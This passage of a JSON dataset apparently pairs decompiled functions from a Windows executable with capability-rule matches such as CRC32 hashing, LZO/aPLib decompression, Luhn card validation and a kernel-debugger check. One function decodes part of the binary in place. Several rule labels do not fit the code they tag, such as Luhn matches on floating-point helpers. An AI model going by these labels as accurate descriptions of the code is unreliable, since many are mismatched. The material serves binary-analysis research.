        uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x100);\n    }\n    fcn.00405fff(unaff_EDI);\n    return;\n}\n",
        "token_count": 1129
    },
    "0040b68c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.0040b68c(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar1 = (unaff_EBX & 0x10) != 0;\n    if ((unaff_EBX & 8) != 0) {\n        uVar1 = uVar1 | 4;\n    }\n    if ((unaff_EBX & 4) != 0) {\n        uVar1 = uVar1 | 8;\n    }\n    if ((unaff_EBX & 2) != 0) {\n        uVar1 = uVar1 | 0x10;\n    }\n    if ((unaff_EBX & 1) != 0) {\n        uVar1 = uVar1 | 0x20;\n    }\n    if ((unaff_EBX & 0x80000) != 0) {\n        uVar1 = uVar1 | 2;\n    }\n    uVar2 = unaff_EBX & 0x300;\n    if (uVar2 != 0) {\n        if (uVar2 == 0x100) {\n            uVar1 = uVar1 | 0x400;\n        }\n        else if (uVar2 == 0x200) {\n            uVar1 = uVar1 | 0x800;\n        }\n        else if (uVar2 == 0x300) {\n            uVar1 = uVar1 | 0xc00;\n        }\n    }\n    if ((unaff_EBX & 0x30000) == 0) {\n        uVar1 = uVar1 | 0x300;\n    }\n    else if ((unaff_EBX & 0x30000) == 0x10000) {\n        uVar1 = uVar1 | 0x200;\n    }\n    if ((unaff_EBX & 0x40000) != 0) {\n        uVar1 = uVar1 | 0x1000;\n    }\n    return uVar1;\n}\n",
        "token_count": 452
    },
    "0040b71a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b71a(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 0;\n    if ((param_2 & 0x10) != 0) {\n        uVar1 = 0x80;\n    }\n    if ((param_2 & 8) != 0) {\n        uVar1 = uVar1 | 0x200;\n    }\n    if ((param_2 & 4) != 0) {\n        uVar1 = uVar1 | 0x400;\n    }\n    if ((param_2 & 2) != 0) {\n        uVar1 = uVar1 | 0x800;\n    }\n    if ((param_2 & 1) != 0) {\n        uVar1 = uVar1 | 0x1000;\n    }\n    if ((param_2 & 0x80000) != 0) {\n        uVar1 = uVar1 | 0x100;\n    }\n    uVar2 = param_2 & 0x300;\n    if (uVar2 != 0) {\n        if (uVar2 == 0x100) {\n            uVar1 = uVar1 | 0x2000;\n        }\n        else if (uVar2 == 0x200) {\n            uVar1 = uVar1 | 0x4000;\n        }\n        else if (uVar2 == 0x300) {\n            uVar1 = uVar1 | 0x6000;\n        }\n    }\n    param_2 = param_2 & 0x3000000;\n    if (param_2 == 0x1000000) {\n        uVar1 = uVar1 | 0x8040;\n    }\n    else {\n        if (param_2 == 0x2000000) {\n            return uVar1 | 0x40;\n        }\n        if (param_2 == 0x3000000) {\n            return uVar1 | 0x8000;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 476
    },
    "0040c645": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c645(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403d40(0x4101a8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00403a31();\n        *puVar2 = 0;\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x41389c)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4138a0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040da2d(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00403a1e();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00403a31();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040bf48(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040c711();\n                goto code_r0x0040c708;\n            }\n        }\n        puVar2 = fcn.00403a31();\n        *puVar2 = 0;\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 9;\n        fcn.00403521();\n    }\ncode_r0x0040c708:\n    fcn.00403d85();\n    return;\n}\n",
        "token_count": 615
    },
    "004081cc": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.004081cc(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.00403a1e();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < arg_8h) && (arg_8h < *0x41389c)) {\n            return *(*((arg_8h >> 5) * 4 + 0x4138a0) + 4 + (arg_8h & 0x1f) * 0x40) & 0x40;\n        }\n        puVar1 = fcn.00403a1e();\n        *puVar1 = 9;\n        fcn.00403521();\n    }\n    return 0;\n}\n",
        "token_count": 190
    },
    "0040c7f2": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040c7f2(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint dwMoveMethod)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t arg_8h_00;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_10h;\n    iVar2 = fcn.0040d9c4(arg_8h);\n    if (iVar2 == -1) {\n        puVar3 = fcn.00403a1e();\n        *puVar3 = 9;\ncode_r0x0040c823:\n        iVar2 = -1;\n        lpDistanceToMoveHigh = 0xffffffff;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar2, arg_ch, &lpDistanceToMoveHigh, dwMoveMethod);\n        if (iVar2 == -1) {\n            arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (arg_8h_00 != 0) {\n                fcn.00403a44(arg_8h_00);\n                goto code_r0x0040c823;\n            }\n        }\n        puVar1 = *((arg_8h >> 5) * 4 + 0x4138a0) + 4 + (arg_8h & 0x1f) * 0x40;\n        *puVar1 = *puVar1 & 0xfd;\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar2);\n}\n",
        "token_count": 367
    },
    "00408672": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * __cdecl fcn.00408672(uint8_t *arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t *puVar6;\n    bool bVar7;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar6 = NULL;\n    fcn.004023de(arg_10h);\n    if (arg_8h == NULL) {\n        puVar3 = fcn.00403a1e();\n        *puVar3 = 0x16;\n        fcn.00403521();\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n        puVar6 = NULL;\n    }\n    else if (*(var_ch + 8) == 0) {\n        puVar6 = fcn.00406020(arg_8h, arg_ch);\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n    }\n    else {\n        do {\n            uVar5 = *arg_8h;\n            if ((*(uVar5 + 0x1d + var_ch) & 4) == 0) {\n                bVar7 = arg_ch == uVar5;\ncode_r0x00408700:\n                puVar4 = arg_8h;\n                if (bVar7) {\n                    puVar6 = arg_8h;\n                }\n            }\n            else {\n                puVar4 = arg_8h + 1;\n                uVar1 = *puVar4;\n                if (uVar1 == 0) {\n                    bVar7 = puVar6 == NULL;\n                    arg_8h = puVar4;\n                    uVar5 = uVar1;\n                    goto code_r0x00408700;\n                }\n                uVar2 = CONCAT11(uVar5, uVar1);\n                uVar5 = uVar1;\n                if (arg_ch == uVar2) {\n                    puVar6 = arg_8h;\n                }\n            }\n            arg_8h = puVar4 + 1;\n        } while (uVar5 != 0);\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n    }\n    return puVar6;\n}\n",
        "token_count": 627
    },
    "004087c8": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * __cdecl fcn.004087c8(uint8_t *arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004023de(arg_10h);\n    if (arg_8h == NULL) {\n        puVar3 = fcn.00403a1e();\n        *puVar3 = 0x16;\n        fcn.00403521();\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n        arg_8h = NULL;\n    }\n    else {\n        if (*(var_ch + 8) == 0) {\n            arg_8h = fcn.0040c9c0(arg_8h, arg_ch);\n        }\n        else {\n            while( true ) {\n                uVar2 = *arg_8h;\n                if (uVar2 == 0) break;\n                if ((*(uVar2 + 0x1d + var_ch) & 4) == 0) {\n                    puVar4 = arg_8h;\n                    if (arg_ch == uVar2) break;\n                }\n                else {\n                    uVar1 = arg_8h[1];\n                    if (uVar1 == 0) goto code_r0x00408866;\n                    puVar4 = arg_8h + 1;\n                    if (arg_ch == CONCAT11(uVar2, uVar1)) goto code_r0x00408858;\n                }\n                arg_8h = puVar4 + 1;\n            }\n            if (arg_ch != uVar2) {\ncode_r0x00408866:\n                if (var_4h != '\\0') {\n                    *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n                }\n                return NULL;\n            }\n        }\ncode_r0x00408858:\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 565
    },
    "0040c9c0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040c9c0(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 593
    },
    "0040728d": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040728d(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    uint32_t var_4h;\n    \n    uVar1 = *(arg_ch + 6) >> 4;\n    uVar2 = *(arg_ch + 6) & 0x8000;\n    uVar4 = uVar1 & 0x7ff;\n    uVar3 = *arg_ch;\n    var_4h = 0x80000000;\n    if ((uVar1 & 0x7ff) == 0) {\n        if (((arg_ch[1] & 0xfffff) == 0) && (uVar3 == 0)) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            goto code_r0x00407337;\n        }\n        uVar4 = uVar4 + 0x3c01;\n        var_4h = 0;\n    }\n    else if (uVar4 == 0x7ff) {\n        uVar4 = 0x7fff;\n    }\n    else {\n        uVar4 = uVar4 + 0x3c00;\n    }\n    var_4h = uVar3 >> 0x15 | (arg_ch[1] & 0xfffff) << 0xb | var_4h;\n    uVar3 = uVar3 << 0xb;\n    while( true ) {\n        *arg_8h = uVar3;\n        arg_8h[1] = var_4h;\n        if ((var_4h & 0x80000000) != 0) break;\n        var_4h = var_4h * 2 | *arg_8h >> 0x1f;\n        uVar3 = *arg_8h * 2;\n        uVar4 = uVar4 - 1;\n    }\n    uVar2 = uVar2 | uVar4;\ncode_r0x00407337:\n    *(arg_8h + 2) = uVar2;\n    return;\n}\n",
        "token_count": 494
    },
    "00407340": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00407340(uint arg_8h, uint noname_1, int32_t *arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint in_stack_ffffffb0;\n    ushort uVar5;\n    uint var_30h;\n    uint uStack48;\n    ushort uStack44;\n    int32_t var_24h;\n    uint var_20h;\n    uchar var_1ch [24];\n    uint32_t var_4h;\n    \n    piVar2 = arg_10h;\n    uVar5 = in_stack_ffffffb0 >> 0x10;\n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    var_24h = arg_14h;\n    fcn.0040728d(&var_30h, &arg_8h);\n    iVar4 = fcn.0040acda(var_30h, uStack48, CONCAT22(uVar5, uStack44), 0x11, 0, &var_20h);\n    iVar3 = var_24h;\n    piVar2[2] = iVar4;\n    *piVar2 = var_20h._2_1_;\n    piVar2[1] = var_20h;\n    iVar4 = fcn.0040717b(var_24h, arg_18h, var_1ch);\n    if (iVar4 == 0) {\n        piVar2[3] = iVar3;\n        fcn.00405fff(var_30h);\n        return;\n    }\n    fcn.004034cf(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 445
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401000(void)\n\n{\n    int32_t var_4h;\n    \n    // [00] -r-x section size 53248 named .text\n    *0x412be0 = 0xd6;\n    for (var_4h = 0; var_4h < 0x9d2; var_4h = var_4h + 1) {\n        *(var_4h + 0x411000) = *(var_4h + 0x411000) ^ (var_4h + '\\x01') * -0x3d;\n    }\n    return 0;\n}\n",
        "token_count": 140
    },
    "00401070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.00401070(double param_1)\n\n{\n    double dVar1;\n    double dVar2;\n    float10 fVar3;\n    uint var_10h;\n    \n    dVar1 = param_1 - *0x40e1d8;\n    dVar2 = param_1 - *0x40e1d0;\n    fVar3 = fcn.00401339(SUB84(param_1 - *0x40e1c8, 0), param_1 - *0x40e1c8 >> 0x20);\n    return fVar3 * *0x40e1c0 + dVar1 / dVar2;\n}\n",
        "token_count": 150
    },
    "00401339": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00401339(uint arg_8h, uint arg_ch)\n\n{\n    double dVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    float10 fVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.004022e9(0x133f, 0xffff);\n    if ((arg_ch._2_2_ & 0x7ff0) == 0x7ff0) {\n        iVar2 = fcn.0040219f(arg_8h, CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h)) >> 0x20);\n        if (iVar2 == 1) {\n            fcn.004022e9(arg_8h_00, 0xffff);\n            fVar3 = CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h));\n        }\n        else if (iVar2 == 2) {\n            fcn.004022e9(arg_8h_00, 0xffff);\n            fVar3 = -CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h));\n        }\n        else {\n            dVar1 = CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h));\n            if (iVar2 == 3) {\n                fVar3 = fcn.00402053(0x15, arg_8h, dVar1 >> 0x20, arg_8h_00);\n            }\n            else {\n                dVar1 = dVar1 + *0x40e1d0;\n                fVar3 = fcn.004020a8(8, 0x15, CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h)), SUB84(dVar1, 0), \n                                     dVar1 >> 0x20);\n            }\n        }\n    }\n    else {\n        _var_8h = CONCAT44(arg_ch, arg_8h) & 0x7fffffffffffffff;\n        fcn.004022e9(arg_8h_00, 0xffff);\n        fVar3 = _var_8h;\n    }\n    return fVar3;\n}\n",
        "token_count": 511
    },
    "004014f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014f5(code **arg_8h, code **arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    while ((arg_8h < arg_ch && (iVar1 == 0))) {\n        if (*arg_8h != NULL) {\n            iVar1 = (**arg_8h)();\n        }\n        arg_8h = arg_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0042e2fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl loc.0042e2fa(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.004015b0(*(unaff_EBP + 8), 0, 0);\n    return;\n}\n",
        "token_count": 55
    },
    "0042e30b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl loc.0042e30b(uint arg_8h)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.004015b0(arg_8h, 1, 0);\n    return uVar1;\n}\n",
        "token_count": 55
    },
    "00401758": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00401758(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.00403d40(0x40ff70, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.00403a1e();\n        *puVar1 = 0x16;\n        fcn.00403521();\n    }\n    else {\n        iVar2 = fcn.0040413d();\n        fcn.00404255(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0040413d();\n        arg_8h_00 = fcn.004042f2(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.0040413d();\n        uVar4 = fcn.00404457(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.0040413d();\n        fcn.0040438e(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004017ec();\n    }\n    fcn.00403d85();\n    return;\n}\n",
        "token_count": 445
    },
    "004017ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004017ec(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040413d();\n    fcn.004042c3(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 54
    },
    "00401fb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.00401fb3(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    do {\n        if (*(iVar1 * 8 + 0x4119e0) == arg_ch) {\n            var_1ch = *(iVar1 * 8 + 0x4119e4);\n            goto code_r0x00401fd1;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x1d);\n    var_1ch = 0;\ncode_r0x00401fd1:\n    if (var_1ch != 0) {\n        var_18h = arg_10h;\n        var_14h = arg_14h;\n        var_10h = arg_18h;\n        var_ch = arg_1ch;\n        var_8h = arg_20h;\n        var_20h = arg_8h;\n        var_4h = arg_24h;\n        fcn.004022e9(arg_28h, 0xffff);\n        iVar1 = fcn.00405ffc(&var_20h);\n        if (iVar1 == 0) {\n            fcn.00401f52(arg_8h);\n        }\n        return CONCAT44(var_4h, var_8h);\n    }\n    fcn.004022e9(arg_28h, 0xffff);\n    fcn.00401f52(arg_8h);\n    return CONCAT44(arg_24h, arg_20h);\n}\n",
        "token_count": 446
    },
    "004025b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004025b9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00402577(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 55
    },
    "0042e00d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl loc.0042e00d(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    \n    uVar1 = fcn.00402779(*(unaff_EBP + 8), unaff_retaddr, arg_8h, in_stack_00000008, in_stack_0000000c, \n                         in_stack_00000010);\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00402f32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402f32(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        uVar1 = (*_sym.imp.KERNEL32.dll_EncodePointer)(*(uVar2 + 0x411b0c));\n        *(uVar2 + 0x411b0c) = uVar1;\n        uVar2 = uVar2 + 4;\n    } while (uVar2 < 0x28);\n    return;\n}\n",
        "token_count": 116
    },
    "00402f55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402f55(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407558(0, 0x10000, 0x30000);\n    if (iVar1 != 0) {\n        fcn.004034cf(0, 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00403192": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403192(uint param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = param_3;\n    do {\n        if (*(uVar1 + 4) == param_2) break;\n        uVar1 = uVar1 + 0xc;\n    } while (uVar1 < *0x40ee8c * 0xc + param_3);\n    if ((*0x40ee8c * 0xc + param_3 <= uVar1) || (*(uVar1 + 4) != param_2)) {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 161
    },
    "004039dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004039dc(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        if (param_1 == *(uVar1 * 8 + 0x411c60)) {\n            return *(uVar1 * 8 + 0x411c64);\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x2d);\n    if (param_1 - 0x13U < 0x12) {\n        return 0xd;\n    }\n    return (-(0xe < param_1 - 0xbcU) & 0xe) + 8;\n}\n",
        "token_count": 159
    },
    "00403a67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403a67(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint *arg_8h_00;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x4149d8);\n    puVar2 = (*pcVar1)(*0x4149d4);\n    if ((puVar2 < arg_8h_00) || (iVar7 = puVar2 - arg_8h_00,  iVar7 + 4U < 4)) {\n        return 0;\n    }\n    uVar3 = fcn.00407aa9(arg_8h_00);\n    if (uVar3 < iVar7 + 4U) {\n        uVar4 = 0x800;\n        if (uVar3 < 0x800) {\n            uVar4 = uVar3;\n        }\n        if ((uVar4 + uVar3 < uVar3) || (iVar5 = fcn.00407648(arg_8h_00, uVar4 + uVar3),  iVar5 == 0)) {\n            if (uVar3 + 0x10 < uVar3) {\n                return 0;\n            }\n            iVar5 = fcn.00407648(arg_8h_00, uVar3 + 0x10);\n            if (iVar5 == 0) {\n                return 0;\n            }\n        }\n        puVar2 = iVar5 + (iVar7 >> 2) * 4;\n        *0x4149d8 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar5);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_EncodePointer;\n    uVar6 = (*_sym.imp.KERNEL32.dll_EncodePointer)(arg_8h);\n    *puVar2 = uVar6;\n    *0x4149d4 = (*pcVar1)(puVar2 + 1);\n    return arg_8h;\n}\n",
        "token_count": 503
    },
    "00403ba1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403bb5)\n// WARNING: Removing unreachable block (ram,0x00403bbb)\n// WARNING: Removing unreachable block (ram,0x00403bbd)\n\nvoid fcn.00403ba1(void)\n\n{\n    return;\n}\n",
        "token_count": 63
    },
    "00403bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403bf0(int16_t *arg_8h)\n\n{\n    if ((*arg_8h == 0x5a4d) && (*(*(arg_8h + 0x1e) + arg_8h) == 0x4550)) {\n        return *(*(arg_8h + 0x1e) + arg_8h + 6) == 0x10b;\n    }\n    return false;\n}\n",
        "token_count": 103
    },
    "00403c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
